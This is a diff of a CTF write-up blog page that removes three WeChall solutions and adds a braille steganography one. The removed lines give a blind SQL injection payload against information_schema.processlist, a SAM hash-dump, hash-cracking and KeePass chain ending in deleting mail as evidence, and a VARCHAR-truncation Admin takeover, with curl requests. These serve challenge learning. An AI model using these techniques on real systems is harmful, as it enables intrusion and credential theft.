@@ -234,18 +234,18 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">565</span>
+          <span class="site-state-item-count">468</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">382</span>
+        <span class="site-state-item-count">370</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -281,7 +281,7 @@ p.spoiler {
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-table-names-2/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-connect-the-dots/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -299,7 +299,7 @@ p.spoiler {
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-table-names-2/" class="post-title-link" itemprop="url">WeChall - Table Names II</a>
+          <a href="/wp/WeChall/wechall-connect-the-dots/" class="post-title-link" itemprop="url">WeChall - Connect the Dots</a>
         </h2>
 
         <div class="post-meta-container">
@@ -310,7 +310,7 @@ p.spoiler {
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-13 19:33:08" itemprop="dateCreated datePublished" datetime="2026-06-13T19:33:08+08:00">2026-06-13</time>
+      <time title="Created: 2026-06-06 14:37:02" itemprop="dateCreated datePublished" datetime="2026-06-06T14:37:02+08:00">2026-06-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -338,8 +338,8 @@ p.spoiler {
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-table-names-2/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-table-names-2/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-connect-the-dots/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-connect-the-dots/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -354,310 +354,119 @@ p.spoiler {
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
-<p>Table Names
-的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database_table</span><br></pre></td></tr></table></figure>
-<p>相比第一版，常规的 <code>information_schema.tables</code> /
-<code>database()</code> 路线会被过滤。</p>
-<h3 id="solution">Solution</h3>
-<p>后端查询大致是用隐藏配置拼出完整表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>secret_database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>secret_table<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>不能直接查 <code>information_schema.tables</code> 时，可以转向
-<code>information_schema.processlist</code>。当前正在执行的 SQL
-文本会出现在 <code>processlist.info</code> 中，而这个 SQL 正好包含完整的
-<code>database.table</code>。</p>
-<p>盲注模板：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>test<span class="string">&#x27; OR IF(</span></span><br><span class="line"><span class="string">  (SELECT ASCII(SUBSTR(info, &lt;pos&gt;, 1)) = &lt;ord&gt;</span></span><br><span class="line"><span class="string">   FROM information_schema.processlist</span></span><br><span class="line"><span class="string">   WHERE info LIKE 0x2553454c45435425</span></span><br><span class="line"><span class="string">   LIMIT 1),</span></span><br><span class="line"><span class="string">  1,</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">)#</span></span><br><span class="line"><span class="string">password=test</span></span><br></pre></td></tr></table></figure>
-<p>也可以用二分：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(SUBSTR(info, <span class="operator">&lt;</span>pos<span class="operator">&gt;</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="operator">&lt;</span>mid<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-<p>逐字符恢复 <code>info</code> 后，从 SQL 文本里抽出
-<code>&lt;secret_database&gt;.&lt;secret_table&gt;</code>，再把点号换成下划线提交。</p>
-<p>通过 <code>SUBSTR(info,1,200)</code> 直接从 processlist
-提取完整查询文本，确认当前账号下数据库和表名为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nurfedtables37.userbobbytable7</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">nurfedtables37_userbobbytable7</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-bill-for-bill/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-bill-for-bill/" class="post-title-link" itemprop="url">WeChall - bill for Bill</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-13 19:28:09" itemprop="dateCreated datePublished" datetime="2026-06-13T19:28:09+08:00">2026-06-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:13:03" itemprop="dateModified" datetime="2026-09-15T10:13:03+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-bill-for-bill/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-bill-for-bill/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>Cracking/Forensics 类（Storyline 系列），由 Z 创作。</p>
-<p>一个叫 Bill 的人把秘密藏在加密的 KeePass 数据库里。需要从他的 Windows
-SAM 文件开始，走完整条攻击链才能拿到最终的答案。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给的文件: files.zip</span><br><span class="line">├── SAM        # Windows SAM (Security Account Manager)</span><br><span class="line">├── system     # SYSTEM registry hive（对应加密的 boot key）</span><br><span class="line">└── keepass.kdb  # KeePass 1.x KDB 格式</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<h4 id="step-1从-sam-system-提取-ntlm-hash">Step 1：从 SAM + SYSTEM 提取
-NTLM hash</h4>
-<p><code>secretsdump.py</code>（impacket 包）从 SAM + SYSTEM
-离线提取本地用户的 hash：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -sam SAM -system system LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xac285427313a1c9a8dc2e8b3421a2e22</span><br><span class="line">[*] Dumping local SAM hashes:</span><br><span class="line">Bill:500:7f4ac180230c769790d3d8ad454f5167:cfb69fa6cb1d792d63b02c6eefc807e5:::</span><br></pre></td></tr></table></figure>
-<p>格式：<code>用户:RID:LM_HASH:NTLM_HASH:::</code> NTLM hash（第二个 32
-hex）是 <code>cfb69fa6cb1d792d63b02c6eefc807e5</code>。</p>
-<p>LM hash <code>7f4ac180230c769790d3d8ad454f5167</code> 非空（非
-<code>aad3b4...</code>），说明密码 &gt;= 8 字符，可以用 Ophcrack +
-rainbow table 破解。但走 NTLM 更直接。</p>
-<h4 id="step-2破解-ntlm-hash">Step 2：破解 NTLM hash</h4>
-<p>在线 NTLM 查询 <span class="exturl" data-url="aHR0cHM6Ly9udGxtLnB3">ntlm.pw<i class="fa fa-external-link-alt"></i></span>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ntlm.pw/cfb69fa6cb1d792d63b02c6eefc807e5</span><br><span class="line">→ W3cH4112u1Z99</span><br></pre></td></tr></table></figure>
-<p>离线可用 john + rockyou 或 hashcat。</p>
-<p>Windows 密码: <code>W3cH4112u1Z99</code></p>
-<p>index2.php 有一段 substitution cipher 隐藏 hint，解码后提示用
-Ophcrack + ~380MB rainbow table 破解 LM hash，但 NTLM
-在线查表更快，结果一致（LM 大写版 <code>W3CH4112U1Z99</code>
-无额外信息）。</p>
-<h4 id="step-3解密-keepass">Step 3：解密 KeePass</h4>
-<p>剧情设计上 Bill 是密码复用受害者：KeePass 密码 == Windows 密码。</p>
-<p>keepass.kdb 是 <strong>KeePass 1.x KDB 格式</strong>（非
-KDBX），AES-256-CBC 加密。Python 库 <code>pykeepass</code> 只支持
-KDBX，需用 <code>libkeepass</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install libkeepass</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libkeepass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> libkeepass.<span class="built_in">open</span>(<span class="string">&#x27;keepass.kdb&#x27;</span>, password=<span class="string">&#x27;W3cH4112u1Z99&#x27;</span>) <span class="keyword">as</span> db:</span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> db.entries:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Group: <span class="subst">&#123;entry[<span class="string">&#x27;group&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Title: <span class="subst">&#123;entry[<span class="string">&#x27;title&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Username: <span class="subst">&#123;entry[<span class="string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Password: <span class="subst">&#123;entry[<span class="string">&#x27;password&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
-<p>KeePass 结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Group: credit card</span><br><span class="line">  Title: Amex</span><br><span class="line">  Username: 371234567895006:08/05-18/05:562</span><br><span class="line">  Password:</span><br><span class="line"></span><br><span class="line">Group: Personal</span><br><span class="line">  Title: Personal data</span><br><span class="line">  Username: William Henry Gates III</span><br><span class="line">  Password:</span><br><span class="line"></span><br><span class="line">Group: W1nd0ws</span><br><span class="line">  Title: My home w1n box</span><br><span class="line">  Username: Bill</span><br><span class="line">  Password: W3cH4112u1Z99</span><br><span class="line"></span><br><span class="line">Group: eMail</span><br><span class="line">  Title: My hotmail account</span><br><span class="line">  Username: BillG@h0tma1l.com</span><br><span class="line">  Password:               ← 空字符串，这就是密码</span><br></pre></td></tr></table></figure>
-<p>四个 entry 分布在 7 个 group 中（另有空的 L1nux、M4C、Backup
-组）。</p>
-<p>关键条目：<code>Amex</code> 的 username 包含完整信用卡数据（格式
-<code>CC_NUMBER:VALID_FROM-EXPIRY:CVV</code>）。</p>
-<h4 id="step-4提交信用卡">Step 4：提交信用卡</h4>
-<p><code>check_card.php</code> 接受 POST 字段
-<code>cc</code>（maxlength=31）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  --data-urlencode &#x27;cc=371234567895006:08/05-18/05:562&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/challenge/Z/bill_for_bill/check_card.php&#x27;</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">371234567895006:08/05-18/05:562</span></span>
-<p>返回提示需要登录父亲的邮箱删除交易通知邮件，进入下一步。</p>
-<h4 id="step-5登录邮箱删邮件">Step 5：登录邮箱删邮件</h4>
-<p><code>signin.php</code> 是一个仿 Microsoft Live ID 的钓鱼页面，POST
-到 <code>login.php</code>。</p>
-<p>KeePass 中 email 条目的 password 字段是空字符串，这就是密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST login=BillG@h0tma1l.com&amp;passwd=&amp;SI=Signin&amp;LoginOptions=2</span><br><span class="line">→ 302 Redirect → loggedin.php</span><br></pre></td></tr></table></figure>
-<p>登录后收件箱中有一封来自 M4C 的未读邮件，checkbox 的
-<code>value="thisisit"</code>。通过 <code>loggedin.php?del=sel</code>
-标记删除。</p>
-<p>至此攻击链完成：从 Windows SAM 一路走到删除银行通知邮件。</p>
-<h4 id="step-6提交-wechall-答案">Step 6：提交 WeChall 答案</h4>
-<p>全部分析完成后，在主站 solution form 提交答案：</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">passwordsuxx</span></span>
-<h3 id="summary">Summary</h3>
-<p>完整的 Windows
-凭证盗窃链：<code>SAM+SYSTEM → NTLM hash → 密码复用 → KeePass → 敏感数据泄露 → 登录邮箱销毁证据</code>。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-screwed-signup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-screwed-signup/" class="post-title-link" itemprop="url">WeChall - Screwed Signup</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-11 17:00:23" itemprop="dateCreated datePublished" datetime="2026-06-11T17:00:23+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-screwed-signup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-screwed-signup/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Screwed Signup (Exploit, PHP) by gizmore MySQL VARCHAR 截断 +
-查询不一致导致的权限提升</p>
+<blockquote>
+<p>Connect the Dots (Stegano) This is a stegano challenge from galen.
+Can you see the solution?</p>
 </blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>目标是 login as Admin。题目给了 register/login
-的源码，<code>chall_sql1</code> 表中已有原始 Admin
-记录（<code>access_level=1337</code>）。</p>
-<p>关键源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册 — INSERT 语句</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT IGNORE INTO `chall_sql1` VALUES (&#x27;<span class="subst">$uname</span>&#x27;, &#x27;<span class="subst">$pw</span>&#x27;, 0)&quot;</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录校验</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">screwed_signupGetUser</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `chall_sql1` WHERE `username`=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>点阵隐写挑战。下载图片后需要识别点阵图案代表的含义。</p>
 <h3 id="solution">Solution</h3>
-<p>漏洞是 <strong>VARCHAR 截断</strong> +
-<strong>查询不一致</strong>：</p>
+<p>下载 <code>dots.jpg</code>（288×96 JPEG，Adobe Photoshop CS
+制作）。</p>
+<p>图片由大量黑色圆点组成，分布在白色背景上。仔细观察可以发现点阵排列非常规律：</p>
+<p>顶部的 18×3 点阵，每 2 列一组可以形成 3 行 2 列的 <strong>Braille
+盲文"方"（cell）</strong>，共计 9 方。</p>
+<h4 id="盲文解码">盲文解码</h4>
+<p>英文一级盲文字母表（Grade 1 English Braille）：</p>
+<table>
+<thead>
+<tr>
+<th>字母</th>
+<th>点位</th>
+<th>字母</th>
+<th>点位</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>a</td>
+<td>1</td>
+<td>n</td>
+<td>1,3,4,5</td>
+</tr>
+<tr>
+<td>b</td>
+<td>1,2</td>
+<td>o</td>
+<td>1,3,5</td>
+</tr>
+<tr>
+<td>c</td>
+<td>1,4</td>
+<td>p</td>
+<td>1,2,3,4</td>
+</tr>
+<tr>
+<td>d</td>
+<td>1,4,5</td>
+<td>q</td>
+<td>1,2,3,4,5</td>
+</tr>
+<tr>
+<td>e</td>
+<td>1,5</td>
+<td>r</td>
+<td>1,2,3,5</td>
+</tr>
+<tr>
+<td>f</td>
+<td>1,2,4</td>
+<td>s</td>
+<td>2,3,4</td>
+</tr>
+<tr>
+<td>g</td>
+<td>1,2,4,5</td>
+<td>t</td>
+<td>2,3,4,5</td>
+</tr>
+<tr>
+<td>h</td>
+<td>1,2,5</td>
+<td>u</td>
+<td>1,3,6</td>
+</tr>
+<tr>
+<td>i</td>
+<td>2,4</td>
+<td>v</td>
+<td>1,2,3,6</td>
+</tr>
+<tr>
+<td>j</td>
+<td>2,4,5</td>
+<td>w</td>
+<td>2,4,5,6</td>
+</tr>
+<tr>
+<td>k</td>
+<td>1,3</td>
+<td>x</td>
+<td>1,3,4,6</td>
+</tr>
+<tr>
+<td>l</td>
+<td>1,2,3</td>
+<td>y</td>
+<td>1,3,4,5,6</td>
+</tr>
+<tr>
+<td>m</td>
+<td>1,3,4</td>
+<td>z</td>
+<td>1,3,5,6</td>
+</tr>
+</tbody>
+</table>
+<p>6 点盲文结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列1  列2</span><br><span class="line">●    ●  ← 行1 (点位 1, 4)</span><br><span class="line">●    ●  ← 行2 (点位 2, 5)</span><br><span class="line">●    ●  ← 行3 (点位 3, 6)</span><br></pre></td></tr></table></figure>
 <ul>
-<li>表定义 <code>username VARCHAR(24)</code>，但 PHP 的
-<code>preg_match('/^[a-z0-9A-Z ]{3,64}$/D')</code> 允许最长 <strong>64
-字符</strong></li>
-<li><code>trim()</code> 只去掉首尾空格，中间空格保留</li>
-<li>MySQL 在非严格模式下静默截断超长值到 24 字符</li>
+<li>左侧从上到下: 点 1, 2, 3</li>
+<li>右侧从上到下: 点 4, 5, 6</li>
+<li>凸起点 = "raised" (on), 平点 = "off"</li>
 </ul>
-<p>利用步骤：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 注册: username = &quot;Admin&quot; + 19空格 + &quot;a&quot;    (共 25 字符)</span><br><span class="line">   → trim() 保留中间空格（a 在末尾不会被 trim 删掉）</span><br><span class="line">   → regex 通过（3-64 字符规则）</span><br><span class="line"></span><br><span class="line">2. UserExists(&quot;Admin&quot; + 19空格 + &quot;a&quot;) → false（表中无此长字符串记录）</span><br><span class="line"></span><br><span class="line">3. MySQL INSERT 时截断到 VARCHAR(24):</span><br><span class="line">   实际写入: &quot;Admin&quot; + 19 空格      (access_level=0)</span><br><span class="line"></span><br><span class="line">4. 现在表中有两条 Admin 记录：</span><br><span class="line">   - 原始 Admin (access_level=1337) ← 先插入</span><br><span class="line">   - 我们复制的 Admin (access_level=0) ← 后插入</span><br><span class="line"></span><br><span class="line">5. 登录: username = &quot;Admin&quot;（无空格）</span><br><span class="line">   → PasswordMatch 检查 username+password → 找到我们的记录（密码匹配）</span><br><span class="line">   → GetUser 只查 username → WHERE username=&#x27;Admin&#x27; → 返回第一行 → 原始 Admin</span><br><span class="line">   → access_level=1337 &gt; 0 → solved</span><br></pre></td></tr></table></figure>
-<p>关键：<strong><code>PasswordMatch</code> 检查了密码但
-<code>GetUser</code>
-只查用户名</strong>，两条查询的不一致导致权限提升。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/register.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin                    a&amp;password=hack123&amp;password2=hack123&amp;register=Register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/login.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin&amp;password=hack123&amp;login=Login&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>对照英文一级盲文（Grade 1 English Braille）解码每方中的凸起点位：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Cell 1: dots 2,4,5,6 → t</span><br><span class="line">Cell 2: dots 1,2,5   → h</span><br><span class="line">Cell 3: dots 1,5     → e</span><br><span class="line">Cell 4: dots 2,3,4   → s</span><br><span class="line">Cell 5: dots 1,3,5   → o</span><br><span class="line">Cell 6: dots 1,2,3   → l</span><br><span class="line">Cell 7: dots 1,3,6   → u</span><br><span class="line">Cell 8: dots 2,3,4,5 → t</span><br><span class="line">Cell 9: dots 2,4     → i</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">skunk</span></span>
 
       
     </div>
@@ -684,7 +493,7 @@ KDBX，需用 <code>libkeepass</code>：</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-wc-hashing-game/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-gpg/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -702,7 +511,7 @@ KDBX，需用 <code>libkeepass</code>：</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-wc-hashing-game/" class="post-title-link" itemprop="url">WeChall - WC Hashing Game</a>
+          <a href="/wp/WeChall/wechall-training-gpg/" class="post-title-link" itemprop="url">WeChall - Training - GPG</a>
         </h2>
 
         <div class="post-meta-container">
@@ -713,7 +522,7 @@ KDBX，需用 <code>libkeepass</code>：</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-11 14:16:18" itemprop="dateCreated datePublished" datetime="2026-06-11T14:16:18+08:00">2026-06-11</time>
+      <time title="Created: 2026-06-05 21:36:16" itemprop="dateCreated datePublished" datetime="2026-06-05T21:36:16+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -741,8 +550,8 @@ KDBX，需用 <code>libkeepass</code>：</p>
       </span>
